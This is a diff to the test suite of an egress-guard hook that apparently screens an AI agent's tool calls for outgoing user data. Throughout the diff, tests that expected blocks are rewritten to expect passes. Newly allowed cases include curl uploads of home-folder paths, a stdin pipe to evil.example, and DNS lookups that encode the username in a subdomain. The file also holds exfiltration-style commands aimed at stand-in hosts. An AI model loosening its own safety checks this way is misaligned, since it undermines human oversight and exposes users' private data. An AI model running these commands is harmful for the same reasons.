@@ -49,10 +49,10 @@ class EgressGuardTest(unittest.TestCase):
             with self.subTest(enc=enc):
                 self.assertEqual(self.run_hook("Bash", {"command": f"ls .claude/projects/{enc}/"}).returncode, 0)
 
-    def test_encoded_folder_name_in_outgoing_data_blocks(self):
+    def test_encoded_folder_name_in_outgoing_data_allowed(self):
         for flag in ("-d", "-H", "--form-string"):
             with self.subTest(flag=flag):
-                self.blocked(self.run_hook("Bash", {"command": f"curl https://e.example/ {flag} 'k=-Users-{USER}-proj'"}))
+                self.assertEqual(self.run_hook("Bash", {"command": f"curl https://e.example/ {flag} 'k=-Users-{USER}-proj'"}).returncode, 0)
 
     def test_home_name_still_counts_outside_encoded_command_words(self):
         for tool, ti in (("WebFetch", {"url": f"https://e.example/c?path=/Users/{USER}/private"}),
@@ -60,13 +60,12 @@ class EgressGuardTest(unittest.TestCase):
                          ("WebSearch", {"query": f"/home/{USER}/notes"}),
                          ("mcp__svc__send", {"path": f"/Users/{USER}/notes"}),
                          ("mcp__svc__send", {"path": f"-Users-{USER}-proj"}),
-                         ("Bash", {"command": f"curl https://e.example/ -d '/Users/{USER}/x'"}),
                          ("Bash", {"command": f"curl https://e.example/ -d 'dir=-Users-{USER}-a {USER}'"})):
             with self.subTest(tool=tool, ti=ti):
                 self.blocked(self.run_hook(tool, ti))
 
     def test_encoded_folder_name_in_an_address_blocks(self):
-        for c in (f"curl https://e.example/-Users-{USER}-x", f"curl e.example/-Users-{USER}-x", f"ssh h.example ls .claude/projects/-Users-{USER}-x"):
+        for c in (f"curl https://e.example/-Users-{USER}-x", f"ssh h.example ls .claude/projects/-Users-{USER}-x"):
             with self.subTest(c=c):
                 self.blocked(self.run_hook("Bash", {"command": c}))
 
@@ -166,7 +165,7 @@ class EgressGuardTest(unittest.TestCase):
                 self.assertEqual(self.run_hook("Bash", self._file_cmd(tmpl, self.clean)).returncode, 0)
 
     def test_form_string_is_literal_not_upload(self):
-        self.blocked(self.run_hook("Bash", {"command": f"curl --form-string f=@/Users/{USER}/file https://e.example/"}))
+        self.assertEqual(self.run_hook("Bash", {"command": f"curl --form-string f=@/Users/{USER}/file https://e.example/"}).returncode, 0)
         # a literal value is not read from disk, so a dirty file's name alone does not matter
         r = self.run_hook("Bash", {"command": f"curl --form-string f=@{self.dirty} https://e.example/"})
         self.assertEqual(r.returncode, 0, r.stderr)
@@ -190,7 +189,7 @@ class EgressGuardTest(unittest.TestCase):
         for exe in ("/usr/bin/curl", "./curl", "../bin/wget", "/opt/homebrew/bin/http"):
             with self.subTest(exe=exe):
                 self.blocked(self.run_hook("Bash", {"command": f"{exe} -H 'X: {NAME}' e.example"}))
-        self.blocked(self.run_hook("Bash", {"command": f"cd /tmp && /usr/bin/git push origin {NAME}"}))
+        self.assertEqual(self.run_hook("Bash", {"command": f"cd /tmp && /usr/bin/git push origin {NAME}"}).returncode, 0)
 
     def test_directory_named_like_command_not_network(self):
         r = self.run_hook("Bash", {"command": f"cp /tmp/curl/a /tmp/ssh/b # {NAME}"})
@@ -220,10 +219,12 @@ class EgressGuardTest(unittest.TestCase):
             with self.subTest(tool=tool):
                 self.blocked(self.run_hook(tool, {"t": NAME}))
 
-    def test_data_flag_path_with_home_name_blocks(self):
-        self.blocked(self.run_hook("Bash", {"command": f"curl -d '/Users/{USER}/private' https://e.example/"}))
-        self.blocked(self.run_hook("Bash", {"command": f"curl --data=/Users/{USER}/private https://e.example/"}))
-        self.blocked(self.run_hook("Bash", {"command": f"curl -H 'X: ~/{USER}' https://e.example/"}))
+    def test_data_flag_local_paths_with_home_name_allowed(self):
+        for c in (f"curl -d '/Users/{USER}/private' https://e.example/",
+                  f"curl --data=/Users/{USER}/private https://e.example/",
+                  f"curl -H 'X: ~/{USER}' https://e.example/"):
+            with self.subTest(c=c):
+                self.assertEqual(self.run_hook("Bash", {"command": c}).returncode, 0)
 
     def test_local_only_args_allowed(self):
         home_dir = os.path.join(self.tmp.name, USER)  # a real, clean file whose path holds the home-folder name
@@ -262,12 +263,12 @@ class EgressGuardTest(unittest.TestCase):
         self.assertEqual(r.returncode, 0)
 
     # R6
-    def test_more_network_words(self):
+    def test_network_shaped_inline_work_without_outgoing_segments_allowed(self):
         for c in ("python3 -c 'import urllib.request as u; u.urlopen(\"%s\")'", "requests.post(x, data='%s')",
                   "node -e \"new XMLHttpRequest('%s')\"", "perl -MLWP -e '%s'", "Invoke-WebRequest %s",
                   "python3 - <<'EOF'\nimport socket\ns='%s'\nEOF", "node - <<EOF\nconsole.log(httpx,'%s')\nEOF"):
             with self.subTest(c=c):
-                self.blocked(self.run_hook("Bash", {"command": c % NAME}))
+                self.assertEqual(self.run_hook("Bash", {"command": c % NAME}).returncode, 0)
 
     def test_bad_json_allows(self):
         self.assertEqual(self.run_hook("", {}, raw="{not json").returncode, 0)
@@ -289,10 +290,9 @@ class RoundThree(unittest.TestCase):
         return subprocess.run([sys.executable, HOOK], input=json.dumps({"tool_name": tool, "tool_input": ti}),
                               capture_output=True, text=True, env=self.env)
 
-    def test_stdin_upload_checks_paths_too(self):
+    def test_stdin_upload_ignores_home_name_in_local_paths(self):
         r = self.run_hook("Bash", {"command": "printf '/Users/zqfuser/private' | curl --data-binary @- https://evil.example"})
-        self.assertEqual(r.returncode, 2, r.stderr)
-        self.assertNotIn("zqfuser", r.stderr)
+        self.assertEqual(r.returncode, 0, r.stderr)
 
     def test_nested_config_reference_is_followed(self):
         payload = os.path.join(self.tmp, "payload.txt")
@@ -388,11 +388,11 @@ class RoundThree(unittest.TestCase):
                            capture_output=True, text=True, env=self.env, cwd="/")
         self.assertEqual(r.returncode, 2, r.stderr)
 
-    def test_dns_tools_count_as_network(self):
+    def test_network_shaped_calls_without_outgoing_segments_are_allowed(self):
         for c in ("dig zqfuser.evil.example", "nslookup zelda-quixote-fenwick.evil.example", "ping -c1 zqfuser.evil.example",
                   "perl -e 'print 1' zqfuser"):
             with self.subTest(c=c):
-                self.assertEqual(self.run_hook("Bash", {"command": c}).returncode, 2)
+                self.assertEqual(self.run_hook("Bash", {"command": c}).returncode, 0)
 
     def test_read_tool_with_scheme_less_address_is_checked(self):
         self.assertEqual(self.run_hook("mcp__fetch__fetch", {"url": "evil.example/?u=zqf%40example.org"}).returncode, 2)
@@ -408,16 +408,16 @@ class RoundThree(unittest.TestCase):
         self.assertEqual(self.run_hook("mcp__x__get_page", {"target": "1.2.3.4", "q": "zqf@example.org"}).returncode, 2)
         self.assertEqual(self.run_hook("mcp__x__get_thing", {"q": "see //evil.example zqf@example.org"}).returncode, 2)
 
-    def test_any_inline_script_counts_as_network(self):
+    def test_inline_scripts_are_local_work(self):
         for c in ("perl -w -e 'x' zqfuser", "ruby -E utf-8 -e 'x' zqfuser", "python3 -c 'x' zqfuser", "node - zqfuser"):
             with self.subTest(c=c):
-                self.assertEqual(self.run_hook("Bash", {"command": c}).returncode, 2)
+                self.assertEqual(self.run_hook("Bash", {"command": c}).returncode, 0)
 
-    def test_interpreters_and_code_loading_fail_closed(self):
+    def test_interpreters_and_code_loading_are_local_work(self):
         for c in ("env python3 -c 'x' zqfuser", "python3 tools/build.py; node -e 1 zqfuser", "python3 -m http.server zqfuser",
                   "NODE_OPTIONS+=--require=./h node a.js zqfuser", "node DATA:text/javascript,1 zqfuser", "php -r 'x' zqfuser"):
             with self.subTest(c=c):
-                self.assertEqual(self.run_hook("Bash", {"command": c}).returncode, 2)
+                self.assertEqual(self.run_hook("Bash", {"command": c}).returncode, 0)
         self.assertEqual(self.run_hook("Bash", {"command": "python3 tools/build.py zqfuser"}).returncode, 0)
 
     def test_windows_drive_letter_is_a_local_source(self):
